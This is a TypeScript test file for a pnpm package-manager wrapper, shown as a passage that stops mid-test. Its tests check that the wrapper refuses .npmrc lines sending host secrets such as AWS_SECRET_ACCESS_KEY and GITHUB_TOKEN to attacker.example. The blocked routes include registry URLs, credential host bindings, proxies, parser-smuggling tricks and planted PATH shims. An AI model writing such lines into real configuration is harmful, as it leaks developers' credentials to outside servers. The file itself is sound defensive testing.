import * as Effect from "effect/Effect"
import * as FileSystem from "effect/FileSystem"
import * as Layer from "effect/Layer"
import * as PlatformError from "effect/PlatformError"
import * as Schema from "effect/Schema"
import { execFileSync } from "node:child_process"
import * as NodeFs from "node:fs"
import * as Fs from "node:fs/promises"
import * as Os from "node:os"
import * as NodePath from "node:path"
import { describe, expect, it } from "vitest"
import * as PackageManager from "../src/PackageManager.ts"
import * as Runtime from "../src/Runtime.ts"
import * as ExecutableFixture from "./ExecutableFixture.ts"
import { writeExecutable } from "./ExecutableFixture.ts"

const platform = { os: "linux", arch: "x64", libc: null }

/**
 * The runtime layer every manager construction runs over.
 *
 * The manager takes the platform from this service rather than from its own
 * options, so a test that builds a manager has to provide one.
 */
const runtimeLayer = Runtime.layerNoop("node", {
  requirement: ">=22.19.0",
  version: "24.9.0",
  platform
})

/**
 * The same runtime, on a Windows host.
 *
 * The manager reads `platform.os` from this service to decide which name rule
 * the ambient environment is held to, so a Windows-only rule needs a Windows
 * runtime rather than a Windows machine.
 */
const windowsRuntimeLayer = Runtime.layerNoop("node", {
  requirement: ">=22.19.0",
  version: "24.9.0",
  platform: { os: "win32", arch: "x64", libc: null }
})

const withFixture = async <A>(name: string, use: (root: string) => Promise<A>): Promise<A> => {
  const root = await Fs.realpath(await Fs.mkdtemp(NodePath.join(Os.tmpdir(), `smthrs-${name}-`)))
  try {
    return await use(root)
  } finally {
    await Fs.rm(root, { recursive: true, force: true })
  }
}

const makePnpm = (projectRoot: string, executable: string, options: {
  readonly environment?: Readonly<Record<string, string | undefined>>
  readonly timeoutMs?: number
  readonly storeDirectory?: string
  readonly credentialHosts?: ReadonlyArray<string> | undefined
} = {}) =>
  Effect.runPromise(
    PackageManager.makePnpm({
      requirement: "11.21.0",
      projectRoot,
      executable,
      environment: options.environment ?? process.env,
      timeoutMs: options.timeoutMs,
      storeDirectory: options.storeDirectory,
      // The fixtures bind credentials to registry.example; tests of the
      // default pass `credentialHosts: undefined` explicitly.
      credentialHosts: "credentialHosts" in options ? options.credentialHosts : ["registry.example"]
    }).pipe(Effect.provide(ExecutableFixture.layer), Effect.provide(runtimeLayer))
  )

describe("PackageManager.storeRoot", () => {
  it("is the fixed .flows store root", () => {
    expect(PackageManager.storeRoot).toBe(".flows/store")
  })

  it("gives every manager a fixed store directory below it", () => {
    for (const name of ["pnpm", "bun"] as const) {
      expect(
        PackageManager.makeNoop(name, { requirement: "11.21.0", projectRoot: "/workspace" }, platform).storeDirectory
      ).toBe(
        `.flows/store/${name}`
      )
    }
  })

  it("keeps unsupported manager metadata truthful", async () => {
    const bun = await Effect.runPromise(
      PackageManager.makeBun({ requirement: "11.21.0", projectRoot: "/workspace" }).pipe(Effect.provide(runtimeLayer))
    )
    expect(bun.lockfileName).toBe("bun.lock")
    await expect(Effect.runPromise(bun.fetch)).rejects.toThrow(/no bun implementation/)
    expect(
      PackageManager.makeNoop("pnpm", { requirement: "11.21.0", projectRoot: "/workspace" }, platform).lockfileName
    ).toBe(
      "pnpm-lock.yaml"
    )
  })

  /**
   * `layerBun` advertised `ChildProcessSpawner` and `FileSystem` alongside
   * `Runtime`, the pnpm layer's requirements, while `makeBun` only ever reads
   * the runtime and returns the refusing service. A composition that selected
   * the unsupported manager had to plumb two host services nothing consumed.
   */
  it("builds the Bun layer over the runtime alone", async () => {
    const layer: Layer.Layer<PackageManager.PackageManager, never, Runtime.Runtime> = PackageManager.layerBun({
      requirement: "1.2.0",
      projectRoot: "/workspace"
    })
    const bun = await Effect.runPromise(
      Effect.gen(function*() {
        return yield* PackageManager.PackageManager
      }).pipe(Effect.provide(layer.pipe(Layer.provide(runtimeLayer))))
    )
    expect(bun.name).toBe("bun")
    expect(bun.platformSensitive).toBe(true)
    await expect(Effect.runPromise(bun.fetch)).rejects.toThrow(/no bun implementation/)
  })

  /**
   * Three construction seams take a caller's `Platform`, and each validated
   * it with its own copy of the rules. The store-manifest copy had dropped the
   * NUL check the two service constructors enforce, so a manifest accepted the
   * exact platform both services refused and serialized the NUL into the
   * store's identity. One validator now answers for all three.
   */
  it("refuses the same unusable platform on every construction seam", () => {
    const digest = "0".repeat(64) as PackageManager.Digest
    const manifest = (member: string) =>
      PackageManager.storeManifestText({
        manager: "pnpm",
        managerVersion: "10.10.0",
        platform: { ...platform, os: member },
        lockfileDigest: digest,
        npmrcDigest: null
      })
    for (const member of ["linux\0", "", "\ud800", "a".repeat(257)]) {
      expect(() =>
        Runtime.makeNoop("node", { requirement: ">=22.19.0", version: "24.9.0", platform: { ...platform, os: member } })
      )
        .toThrow(/os and arch must be non-empty usable text/)
      expect(() =>
        PackageManager.makeNoop("pnpm", { requirement: "11.21.0", projectRoot: "/workspace" }, {
          ...platform,
          os: member
        })
      ).toThrow(/os and arch must be non-empty usable text/)
      expect(() => manifest(member)).toThrow(/os and arch must be non-empty usable text/)
    }
    expect(() => manifest("a".repeat(256))).not.toThrow()
    expect(() =>
      PackageManager.storeManifestText({
        manager: "pnpm",
        managerVersion: "10.10.0",
        platform: { ...platform, libc: "glibc\0" },
        lockfileDigest: digest,
        npmrcDigest: null
      })
    ).toThrow(/libc must be non-empty usable text/)
  })

  it("validates manager construction options before exposing a service", () => {
    expect(() => PackageManager.makeNoop("bun", { requirement: "11.21.0", projectRoot: "relative" }, platform))
      .toThrow(/absolute path/)
    expect(() =>
      PackageManager.makeNoop("bun", {
        requirement: "11.21.0",
        projectRoot: "/workspace",
        timeoutMs: 0
      }, platform)
    ).toThrow(/timeout must be an integer/)
    const timeoutOf = (timeoutMs: number) =>
      PackageManager.makeNoop("bun", { requirement: "11.21.0", projectRoot: "/workspace", timeoutMs }, platform)
    expect(timeoutOf(PackageManager.maximumCommandTimeoutMs).name).toBe("bun")
    expect(() => timeoutOf(PackageManager.maximumCommandTimeoutMs + 1)).toThrow(/timeout must be an integer/)
    expect(() => timeoutOf(1.5)).toThrow(/timeout must be an integer/)
    expect(() =>
      PackageManager.makeNoop("bun", {
        requirement: "11.21.0",
        projectRoot: "/workspace",
        environment: { Path: "one", PATH: "two" }
      }, { ...platform, os: "win32" })
    ).toThrow(/case-insensitive name/)
  })

  /**
   * `layerPackageManager` hands these options the host's own `process.env`. A
   * Windows runner's environment carries names the POSIX convention never
   * produces: `ProgramFiles(x86)` and `CommonProgramFiles(x86)` are set by
   * Windows itself on every 64-bit image. The record is a lookup source, not a
   * set of declarations, so refusing it because the operating system named a
   * variable the way it always has is a build that cannot run.
   */
  it("accepts the environment names a Windows host sets for itself", () => {
    expect(() =>
      PackageManager.makeNoop("pnpm", {
        requirement: "11.21.0",
        projectRoot: "/workspace",
        environment: {
          Path: "C:\\Windows",
          "ProgramFiles(x86)": "C:\\Program Files (x86)",
          "CommonProgramFiles(x86)": "C:\\Program Files (x86)\\Common Files"
        }
      }, { ...platform, os: "win32" })
    ).not.toThrow()
  })

  /**
   * Windows still has a name rule, and it is the environment block's own: a
   * name is non-empty and carries neither `=` nor a control character, because
   * `NAME=VALUE` entries separated by NUL are all the block can represent. A
   * name the block cannot carry fails here rather than reaching a spawn.
   */
  it("refuses a name a Windows environment block cannot carry", () => {
    for (const name of ["A=B", "", "A\u0007B"]) {
      expect(() =>
        PackageManager.makeNoop("pnpm", {
          requirement: "11.21.0",
          projectRoot: "/workspace",
          environment: { [name]: "x" }
        }, { ...platform, os: "win32" })
      ).toThrow(/environment name is not portable/)
    }
  })

  /** Off Windows the portable name rule is unchanged. */
  it("keeps the portable name rule on a POSIX host", () => {
    expect(() =>
      PackageManager.makeNoop("pnpm", {
        requirement: "11.21.0",
        projectRoot: "/workspace",
        environment: { "ProgramFiles(x86)": "C:\\Program Files (x86)" }
      }, platform)
    ).toThrow(/package-manager environment name is not portable: "ProgramFiles\(x86\)"/)
  })

  it("does not invoke user string conversion while rejecting an invalid timeout", () => {
    let calls = 0
    const timeout = {
      toString: () => {
        calls += 1
        return "0"
      }
    }
    expect(() =>
      PackageManager.makeNoop("bun", {
        requirement: "11.21.0",
        projectRoot: "/workspace",
        timeoutMs: timeout as never
      }, platform)
    ).toThrow(/received object/)
    expect(calls).toBe(0)
  })

  it("rejects accessors, proxies, unknown fields, and malformed environment values", () => {
    let reads = 0
    const accessor = Object.defineProperty({ requirement: "11.21.0" }, "projectRoot", {
      enumerable: true,
      get: () => {
        reads += 1
        return "/workspace"
      }
    })
    expect(() => PackageManager.makeNoop("bun", accessor as never, platform)).toThrow(/data property/)
    expect(reads).toBe(0)
    expect(() =>
      PackageManager.makeNoop(
        "bun",
        new Proxy({ requirement: "11.21.0", projectRoot: "/workspace" }, {
          ownKeys: () => {
            throw new Error("trap")
          }
        }),
        platform
      )
    ).toThrow(/inspected safely/)
    expect(() =>
      PackageManager.makeNoop("bun", {
        requirement: "11.21.0",
        projectRoot: "/workspace",
        typo: true
      } as never, platform)
    ).toThrow(/unknown property "typo"/)
    expect(() =>
      PackageManager.makeNoop("bun", {
        requirement: "11.21.0",
        projectRoot: "/workspace",
        environment: { TOKEN: 42 } as never
      }, platform)
    ).toThrow(/must be a string or undefined/)
  })

  it("snapshots options and environment before exposing a service", async () => {
    await withFixture("package-manager-options-snapshot", async (root) => {
      const other = await Fs.mkdtemp(NodePath.join(Os.tmpdir(), "smthrs-mutated-root-"))
      try {
        const executable = NodePath.join(root, "pnpm.mjs")
        await Fs.writeFile(NodePath.join(root, ".npmrc"), "//registry.example/:_authToken=${NPM_TOKEN}\n", "utf8")
        await writeExecutable(
          executable,
          "process.stdout.write(`${process.cwd()}|${process.env.NPM_TOKEN}\\n`)"
        )
        const environment: Record<string, string | undefined> = {
          NPM_TOKEN: "original",
          PATH: process.env.PATH
        }
        const credentialHosts = ["registry.example"]
        const options = {
          requirement: "11.21.0",
          projectRoot: root,
          executable,
          environment,
          credentialHosts
        }
        const manager = await Effect.runPromise(
          PackageManager.makePnpm(options).pipe(
            Effect.provide(ExecutableFixture.layer),
            Effect.provide(runtimeLayer)
          )
        )
        options.projectRoot = other
        environment.NPM_TOKEN = "mutated"
        credentialHosts[0] = "elsewhere.example"

        expect(await Effect.runPromise(manager.version)).toBe(`${root}|original`)
        expect(manager.projectRoot).toBe(root)
        expect(manager.requirement).toBe("11.21.0")
      } finally {
        await Fs.rm(other, { recursive: true, force: true })
      }
    })
  })

  it("strictly validates canonical store and linked-tree manifest inputs", async () => {
    const digest = "0".repeat(64) as PackageManager.Digest
    const alternate = "1".repeat(64) as PackageManager.Digest
    const valid = {
      manager: "pnpm" as const,
      managerVersion: "10.10.0",
      platform,
      lockfileDigest: digest,
      npmrcDigest: null
    }
    expect(PackageManager.storeManifestText(valid)).toContain("smithers-build/store-manifest/v1")
    expect(() => PackageManager.storeManifestText({ ...valid, npmrcDigest: undefined as never })).toThrow(
      /SHA-256 digest or null/
    )
    expect(() => PackageManager.storeManifestText({ ...valid, lockfileDigest: "A".repeat(64) })).toThrow(
      /lowercase SHA-256 digest/
    )
    expect(() => PackageManager.storeManifestText({ ...valid, extra: true } as never)).toThrow(
      /unknown property "extra"/
    )

    let reads = 0
    const accessor = Object.defineProperty({ ...valid }, "managerVersion", {
      enumerable: true,
      get: () => {
        reads += 1
        return "10.10.0"
      }
    })
    expect(() => PackageManager.storeManifestText(accessor)).toThrow(/data property/)
    expect(reads).toBe(0)

    await expect(Effect.runPromise(
      PackageManager.linkedTreeManifest({
        storeDigest: digest,
        packageJsonDigest: alternate,
        managerEvidence: undefined as never
      }).pipe(Effect.provide(ExecutableFixture.layer))
    )).rejects.toThrow(/lowercase SHA-256 digests/)
  })

  it("snapshots and freezes store manifest identity while hashing", async () => {
    const digest = "0".repeat(64) as PackageManager.Digest
    const mutablePlatform = { ...platform }
    const input = {
      manager: "pnpm" as const,
      managerVersion: "10.10.0",
      platform: mutablePlatform,
      lockfileDigest: digest,
      npmrcDigest: null
    }
    const resultPromise = Effect.runPromise(
      PackageManager.storeManifest(input).pipe(Effect.provide(ExecutableFixture.layer))
    )
    input.managerVersion = "99.0.0"
    mutablePlatform.arch = "arm64"
    const result = await resultPromise
    expect(result.managerVersion).toBe("10.10.0")
    expect(result.platform).toEqual(platform)
    expect(Object.isFrozen(result)).toBe(true)
    expect(Object.isFrozen(result.platform)).toBe(true)
    expect(result.digest).toBe(
      await Effect.runPromise(
        PackageManager.storeManifest({
          ...input,
          managerVersion: "10.10.0",
          platform
        }).pipe(Effect.provide(ExecutableFixture.layer), Effect.map((manifest) => manifest.digest))
      )
    )
  })

  it("anchors concurrent manager processes to their own project roots without changing the host cwd", async () => {
    const fixture = await Fs.realpath(
      await Fs.mkdtemp(NodePath.join(Os.tmpdir(), "smthrs-package-manager-root-"))
    )
    const left = NodePath.join(fixture, "left")
    const right = NodePath.join(fixture, "right")
    const executable = NodePath.join(fixture, "pnpm.mjs")
    await Promise.all([Fs.mkdir(left), Fs.mkdir(right)])
    await writeExecutable(
      executable,
      "import { appendFileSync } from \"node:fs\"\n" +
        "appendFileSync(\"calls\", process.cwd() + \"\\n\")\n" +
        "if (process.argv[2] === \"--version\") process.stdout.write(\"9.15.0\\n\")\n"
    )
    const original = process.cwd()
    const run = (projectRoot: string) =>
      Effect.runPromise(
        Effect.gen(function*() {
          const manager = yield* PackageManager.makePnpm({
            requirement: "9.15.0",
            projectRoot,
            executable,
            environment: process.env
          })
          expect(manager.projectRoot).toBe(projectRoot)
          expect(yield* manager.version).toBe("9.15.0")
          yield* manager.fetch
        }).pipe(Effect.provide(ExecutableFixture.layer), Effect.provide(runtimeLayer))
      )
    try {
      await Promise.all([run(left), run(right)])
      expect(process.cwd()).toBe(original)
      expect((await Fs.readFile(NodePath.join(left, "calls"), "utf8")).trim().split("\n")).toEqual([left, left])
      expect((await Fs.readFile(NodePath.join(right, "calls"), "utf8")).trim().split("\n")).toEqual([
        right,
        right
      ])
    } finally {
      await Fs.rm(fixture, { recursive: true, force: true })
    }
  })

  it("passes only bootstrap variables and credentials explicitly referenced by .npmrc", async () => {
    await withFixture("package-manager-env", async (root) => {
      const executable = NodePath.join(root, "pnpm.mjs")
      await Fs.writeFile(NodePath.join(root, ".npmrc"), "//registry.example/:_authToken=${NPM_TOKEN}\n", "utf8")
      await writeExecutable(
        executable,
        "process.stdout.write(JSON.stringify({" +
          "path: process.env.PATH," +
          "token: process.env.NPM_TOKEN," +
          "secret: process.env.UNRELATED_SECRET," +
          "home: process.env.HOME," +
          "userconfig: process.env.NPM_CONFIG_USERCONFIG" +
          "}))"
      )
      // Relative PATH entries are dropped before spawning, so hand in only absolute ones.
      const path = (process.env.PATH ?? "").split(NodePath.delimiter).filter((entry) => NodePath.isAbsolute(entry))
        .join(NodePath.delimiter)
      const manager = await makePnpm(root, executable, {
        environment: {
          PATH: path,
          HOME: "/hidden/home",
          NPM_TOKEN: "declared-token",
          UNRELATED_SECRET: "must-not-leak"
        }
      })
      const observed = JSON.parse(await Effect.runPromise(manager.version)) as Record<string, unknown>
      expect(observed.path).toBe(path)
      expect(observed.token).toBe("declared-token")
      expect(observed.secret).toBeUndefined()
      expect(observed.home).toBeUndefined()
      expect(observed.userconfig).toBe("/dev/null")
    })
  })

  it("forwards placeholders only from live .npmrc values", async () => {
    await withFixture("package-manager-env-comments", async (root) => {
      const executable = NodePath.join(root, "pnpm.mjs")
      await Fs.writeFile(
        NodePath.join(root, ".npmrc"),
        [
          "  ; _authToken=${LEGACY_SECRET}",
          "  # proxy=${PROXY_CREDENTIAL}",
          "",
          "//registry.example/:_authToken=${NPM_TOKEN}"
        ].join("\n"),
        "utf8"
      )
      await writeExecutable(executable, "process.stdout.write(JSON.stringify(process.env))")
      const manager = await makePnpm(root, executable, {
        environment: {
          PATH: process.env.PATH,
          LEGACY_SECRET: "comment-only",
          PROXY_CREDENTIAL: "comment-only",
          NPM_TOKEN: "live-token"
        }
      })
      const observed = JSON.parse(await Effect.runPromise(manager.version)) as Record<string, unknown>
      expect(observed.NPM_TOKEN).toBe("live-token")
      for (const name of ["LEGACY_SECRET", "PROXY_CREDENTIAL"]) {
        expect(observed).not.toHaveProperty(name)
      }
    })
  })

  /**
   * pnpm expands `${NAME}` in every `.npmrc` value, and every referenced name
   * was forwarded. A repository could spell a host secret into a registry URL
   * or an unscoped credential that follows `registry=`, and `pnpm fetch` sent
   * it to a server the repository chose.
   */
  it.each([
    "registry=https://attacker.example/${AWS_SECRET_ACCESS_KEY}/",
    "@scope:registry=https://${AWS_SECRET_ACCESS_KEY}.attacker.example/",
    "https-proxy=http://attacker.example/${AWS_SECRET_ACCESS_KEY}",
    "_authToken=${AWS_SECRET_ACCESS_KEY}",
    "//registry.example/:_authToken=prefix-${AWS_SECRET_ACCESS_KEY}",
    "//registry.example/:ca=${AWS_SECRET_ACCESS_KEY}"
  ])("refuses a placeholder outside a registry-scoped credential: %s", async (line) => {
    await withFixture("package-manager-placeholder-exfil", async (root) => {
      await Fs.writeFile(NodePath.join(root, ".npmrc"), `${line}\n`, "utf8")
      const refusal = await Effect.runPromise(
        PackageManager.npmrcDigest(root).pipe(Effect.flip, Effect.provide(ExecutableFixture.layer))
      )
      expect(refusal.code).toBe("unsafe_configuration")
      const executable = NodePath.join(root, "pnpm.mjs")
      const marker = NodePath.join(root, "spawned")
      await writeExecutable(
        executable,
        `import { writeFileSync } from "node:fs"\nwriteFileSync(${
          JSON.stringify(marker)
        }, String(process.env.AWS_SECRET_ACCESS_KEY))`
      )
      const manager = await makePnpm(root, executable, {
        environment: { PATH: process.env.PATH, AWS_SECRET_ACCESS_KEY: "host-secret" }
      })
      await expect(Effect.runPromise(manager.version)).rejects.toThrow(/environment placeholder|embeds a credential/)
      await expect(Fs.stat(marker)).rejects.toMatchObject({ code: "ENOENT" })
    })
  })

  /**
   * A registry-scoped credential names its own host, and the repository
   * writes that host. Pairing it with `registry=` sent the host variable to
   * a server the checkout chose.
   */
  it.each(
    [
      ["default list", undefined, "//attacker.example/:_authToken=${GITHUB_TOKEN}"],
      ["operator list", ["registry.example"], "//attacker.example/:_authToken=${GITHUB_TOKEN}"],
      ["lookalike host", undefined, "//registry.npmjs.org.attacker.example/:_authToken=${GITHUB_TOKEN}"],
      ["host without path", undefined, "//registry.npmjs.org:_authToken=${GITHUB_TOKEN}"],
      ["port mismatch", ["registry.example"], "//registry.example:8443/:_authToken=${GITHUB_TOKEN}"]
    ] as const
  )("refuses a credential bound to a host outside credentialHosts: %s", async (_label, hosts, line) => {
    await withFixture("package-manager-credential-host", async (root) => {
      await Fs.writeFile(
        NodePath.join(root, ".npmrc"),
        `registry=https://attacker.example/\n${line}\n`,
        "utf8"
      )
      const executable = NodePath.join(root, "pnpm.mjs")
      const marker = NodePath.join(root, "spawned")
      await writeExecutable(
        executable,
        `import { writeFileSync } from "node:fs"\nwriteFileSync(${
          JSON.stringify(marker)
        }, String(process.env.GITHUB_TOKEN))`
      )
      const manager = await makePnpm(root, executable, {
        environment: { PATH: process.env.PATH, GITHUB_TOKEN: "host-secret" },
        credentialHosts: hosts
      })
      await expect(Effect.runPromise(manager.version)).rejects.toThrow(/outside credentialHosts/)
      await expect(Fs.stat(marker)).rejects.toMatchObject({ code: "ENOENT" })
    })
  })

  it("forwards a credential bound to an allowed host, matched case-insensitively", async () => {
    await withFixture("package-manager-credential-host-allowed", async (root) => {
      await Fs.writeFile(
        NodePath.join(root, ".npmrc"),
        "//Registry.NPMJS.org/:_authToken=${NPM_TOKEN}\n//npm.pkg.example:8443/scope/:_authToken=${SCOPE_TOKEN}\n",
        "utf8"
      )
      const executable = NodePath.join(root, "pnpm.mjs")
      const marker = NodePath.join(root, "spawned")
      await writeExecutable(
        executable,
        `import { writeFileSync } from "node:fs"\nwriteFileSync(${
          JSON.stringify(marker)
        }, [process.env.NPM_TOKEN, process.env.SCOPE_TOKEN].join(","))\nconsole.log("11.21.0")`
      )
      const manager = await makePnpm(root, executable, {
        environment: { PATH: process.env.PATH, NPM_TOKEN: "a", SCOPE_TOKEN: "b" },
        credentialHosts: ["registry.npmjs.org", "NPM.pkg.example:8443"]
      })
      await Effect.runPromise(manager.version).catch(() => undefined)
      expect(await Fs.readFile(marker, "utf8")).toBe("a,b")
    })
  })

  it("rejects a malformed credentialHosts option", async () => {
    await withFixture("package-manager-credential-host-invalid", async (root) => {
      for (const hosts of [["https://registry.npmjs.org"], ["a/b"], "registry.npmjs.org"]) {
        await expect(
          makePnpm(root, "pnpm", { credentialHosts: hosts as unknown as ReadonlyArray<string> })
        ).rejects.toThrow(/credentialHosts/)
      }
    })
  })

  /**
   * pnpm reads `.npmrc` with the `ini` decoder: it splits lines on `\r` as well
   * as `\n` and runs quoted values through `JSON.parse`. A setting our parser
   * could not see passed the checks, `GITHUB_TOKEN` was forwarded for the
   * allowed host, and pnpm sent it inside the hidden `registry=` URL.
   */
  it.each(
    [
      ["carriage-return line", "#x\rregistry=https://attacker.example/${GITHUB_TOKEN}/"],
      ["lone carriage return", "\rregistry=https://attacker.example/${GITHUB_TOKEN}/\r"],
      ["JSON escape in a quoted value", "registry=\"https://attacker.example/\\u0024{GITHUB_TOKEN}/\""],
      ["JSON escape in a single-quoted value", "registry='\"https://attacker.example/\\u0024{GITHUB_TOKEN}/\"'"],
      ["placeholder in a setting name", "//registry.example/${GITHUB_TOKEN}/:_authToken=${GITHUB_TOKEN}"],
      ["placeholder as a whole setting name", "${GITHUB_TOKEN}=unused"],
      ["bare placeholder line", "${GITHUB_TOKEN}"]
    ] as const
  )("refuses a placeholder pnpm's ini parser sees: %s", async (_label, line) => {
    await withFixture("package-manager-ini-divergence", async (root) => {
      await Fs.writeFile(
        NodePath.join(root, ".npmrc"),
        `//registry.example/:_authToken=\${GITHUB_TOKEN}\n${line}\n`,
        "utf8"
      )
      const refusal = await Effect.runPromise(
        PackageManager.npmrcDigest(root).pipe(Effect.flip, Effect.provide(ExecutableFixture.layer))
      )
      expect(refusal.code).toBe("unsafe_configuration")
      const executable = NodePath.join(root, "pnpm.mjs")
      const marker = NodePath.join(root, "spawned")
      await writeExecutable(
        executable,
        `import { writeFileSync } from "node:fs"\nwriteFileSync(${
          JSON.stringify(marker)
        }, String(process.env.GITHUB_TOKEN))`
      )
      const manager = await makePnpm(root, executable, {
        environment: { PATH: process.env.PATH, GITHUB_TOKEN: "host-secret" }
      })
      await expect(Effect.runPromise(manager.version)).rejects.toMatchObject({ code: "unsafe_configuration" })
      await expect(Fs.stat(marker)).rejects.toMatchObject({ code: "ENOENT" })
    })
  })

  /**
   * The credential is bound to an allowed host, but a repository proxy still
   * received it (pnpm 10 sent `Authorization: Bearer <secret>` to a capturing
   * proxy for `registry=http://registry.npmjs.org/`).
   */
  it.each([
    "proxy=http://attacker.example:8080/",
    "https-proxy=http://attacker.example:8080/",
    "HTTP-PROXY=http://attacker.example:8080/",
    "noproxy=*",
    "strict-ssl=false",
    "ca=\"-----BEGIN CERTIFICATE-----\"",
    "cafile=evil.pem",
    "registry=http://registry.example/",
    "@scope:registry=http://registry.example/",
    "#x\rhttps-proxy=http://attacker.example:8080/"
  ])("refuses a transport setting beside a forwarded credential: %s", async (line) => {
    await withFixture("package-manager-transport", async (root) => {
      await Fs.writeFile(
        NodePath.join(root, ".npmrc"),
        `//registry.example/:_authToken=\${GITHUB_TOKEN}\n${line}\n`,
        "utf8"
      )
      const executable = NodePath.join(root, "pnpm.mjs")
      const marker = NodePath.join(root, "spawned")
      await writeExecutable(
        executable,
        `import { writeFileSync } from "node:fs"\nwriteFileSync(${
          JSON.stringify(marker)
        }, String(process.env.GITHUB_TOKEN))`
      )
      const manager = await makePnpm(root, executable, {
        environment: { PATH: process.env.PATH, GITHUB_TOKEN: "host-secret" }
      })
      await expect(Effect.runPromise(manager.version)).rejects.toThrow(/changes how a forwarded credential travels/)
      await expect(Fs.stat(marker)).rejects.toMatchObject({ code: "ENOENT" })
    })
  })

  it("keeps a transport setting when no credential is forwarded", async () => {
    await withFixture("package-manager-transport-plain", async (root) => {
      await Fs.writeFile(
        NodePath.join(root, ".npmrc"),
        "registry=http://registry.example/\nhttps-proxy=http://proxy.example:8080/\n",
        "utf8"
      )
      const executable = NodePath.join(root, "pnpm.mjs")
      await writeExecutable(executable, `console.log("11.21.0")`)
      const manager = await makePnpm(root, executable, { environment: { PATH: process.env.PATH } })
      expect(await Effect.runPromise(manager.version)).toBe("11.21.0")
    })
  })

  /**
   * pnpm 10 also reads `httpsProxy`, `httpProxy`, and `strictSsl` from
   * `pnpm-workspace.yaml`, and there they outrank the environment. Only
   * command-line settings outrank them, so a forwarded credential pins every
   * transport setting there, from the operator's own variables.
   */
  it("pins transport settings on the command line only while a credential is forwarded", async () => {
    await withFixture("package-manager-transport-pins", async (root) => {
      const executable = NodePath.join(root, "pnpm.mjs")
      await writeExecutable(
        executable,
        `import { appendFileSync } from "node:fs"\n` +
          `if (process.argv[2] === "--version") { process.stdout.write("11.21.0\\n"); process.exit(0) }\n` +
          `appendFileSync("calls", JSON.stringify(process.argv.slice(2)) + "\\n")`
      )
      await Fs.writeFile(
        NodePath.join(root, "pnpm-workspace.yaml"),
        "httpsProxy: http://attacker.example:8080/\nstrictSsl: false\n"
      )
      const calls = async () =>
        (await Fs.readFile(NodePath.join(root, "calls"), "utf8")).trim().split("\n")
          .map((line) => JSON.parse(line) as Array<string>)
      const pins = (args: Array<string>) => args.filter((arg) => arg.startsWith("--config."))
      await Effect.runPromise((await makePnpm(root, executable, { environment: { PATH: process.env.PATH } })).fetch)
      expect(pins((await calls())[0]!)).toEqual([])
      await Fs.rm(NodePath.join(root, "calls"))
      await Fs.writeFile(NodePath.join(root, ".npmrc"), "//registry.example/:_authToken=${GITHUB_TOKEN}\n", "utf8")
      const operator = await makePnpm(root, executable, {
        environment: {
          PATH: process.env.PATH,
          GITHUB_TOKEN: "host-secret",
          https_proxy: "http://operator.example:3128/",
          NO_PROXY: "internal.example"
        }
      })
      await Effect.runPromise(operator.fetch)
      await Effect.runPromise(operator.link)
      const unproxied = await makePnpm(root, executable, {
        environment: { PATH: process.env.PATH, GITHUB_TOKEN: "host-secret" }
      })
      await Effect.runPromise(unproxied.fetch)
      expect((await calls()).map(pins)).toEqual([
        [
          "--config.proxy=",
          "--config.https-proxy=http://operator.example:3128/",
          "--config.http-proxy=http://operator.example:3128/",
          "--config.noproxy=internal.example",
          "--config.strict-ssl=true",
          "--config.ca="
        ],
        [
          "--config.proxy=",
          "--config.https-proxy=http://operator.example:3128/",
          "--config.http-proxy=http://operator.example:3128/",
          "--config.noproxy=internal.example",
          "--config.strict-ssl=true",
          "--config.ca="
        ],
        [
          "--config.proxy=",
          "--config.https-proxy=",
          "--config.http-proxy=",
          "--config.noproxy=",
          "--config.strict-ssl=true",
          "--config.ca="
        ]
      ])
    })
  })

  /**
   * The child's cwd is the project root, so a relative or empty `PATH` entry
   * resolved `pnpm` to a file the repository planted there.
   */
  it.skipIf(process.platform === "win32")("never resolves pnpm through a relative PATH entry", async () => {
    await withFixture("package-manager-relative-path", async (root) => {
      const marker = NodePath.join(root, "planted-ran")
      await Fs.mkdir(NodePath.join(root, "bin"))
      for (const planted of [NodePath.join(root, "pnpm"), NodePath.join(root, "bin/pnpm")]) {
        await Fs.writeFile(planted, `#!/bin/sh\necho planted > ${JSON.stringify(marker)}\necho 11.21.0\n`, "utf8")
        await Fs.chmod(planted, 0o755)
      }
      const observed = NodePath.join(root, "observed-path")
      const executable = NodePath.join(root, "probe.mjs")
      await writeExecutable(
        executable,
        `import { writeFileSync } from "node:fs"\nwriteFileSync(${JSON.stringify(observed)}, process.env.PATH ?? "")`
      )
      const probe = await makePnpm(root, executable, { environment: { PATH: `.:bin::/usr/bin:` } })
      await Effect.runPromise(probe.version).catch(() => undefined)
      expect(await Fs.readFile(observed, "utf8")).toBe("/usr/bin")
      const manager = await makePnpm(root, "pnpm", { environment: { PATH: ".:bin:" } })
      await expect(Effect.runPromise(manager.version)).rejects.toThrow()
      await expect(Fs.stat(marker)).rejects.toMatchObject({ code: "ENOENT" })
    })
  })

  it("refuses a Windows pnpm.cmd shim reached through a relative PATH entry", async () => {
    await withFixture("package-manager-windows-relative", async (root) => {
      const bin = NodePath.join(root, "tools")
      const entry = NodePath.join(bin, "node_modules/pnpm/bin/pnpm.cjs")
      const marker = NodePath.join(root, "planted-ran")
      await Fs.mkdir(NodePath.dirname(entry), { recursive: true })
      await Fs.writeFile(NodePath.join(bin, "pnpm.cmd"), "@echo planted\n")
      await Fs.writeFile(entry, `require("node:fs").writeFileSync(${JSON.stringify(marker)}, "yes")`)
      const error = await Effect.runPromise(
        PackageManager.makePnpm({
          requirement: "11.21.0",
          projectRoot: root,
          environment: { Path: "tools;.", SystemRoot: process.env.SystemRoot }
        }).pipe(
          Effect.flatMap((manager) => manager.version),
          Effect.flip,
          Effect.provide(ExecutableFixture.layer),
          Effect.provide(Runtime.layerNoop("node", {
            requirement: ">=22.19.0",
            version: "24.9.0",
            executable: process.execPath,
            platform: { ...platform, os: "win32" }
          }))
        )
      )
      expect(error.code).toBe("environment_mismatch")
      await expect(Fs.stat(marker)).rejects.toMatchObject({ code: "ENOENT" })
    })
  })

  /**
   * pnpm also loads hooks named by `pnpmfile` or `globalPnpmfile` in
   * `pnpm-workspace.yaml`, which the store manifest never digested, so an edit
   * to such a hook neither invalidated a fetch nor showed in any declared read.
   * Every command names the one default hook file pnpm would load (the
   * measured one) and clears the global hook, or turns hooks off.
   */
  it("pins pnpm hooks to the measured default hook file", async () => {
    await withFixture("package-manager-pnpmfile", async (root) => {
      const executable = NodePath.join(root, "pnpm.mjs")
      await writeExecutable(
        executable,
        `import { appendFileSync } from "node:fs"\n` +
          `if (process.argv[2] === "--version") { process.stdout.write("11.21.0\\n"); process.exit(0) }\n` +
          `appendFileSync("calls", JSON.stringify(process.argv.slice(2)) + "\\n")`
      )
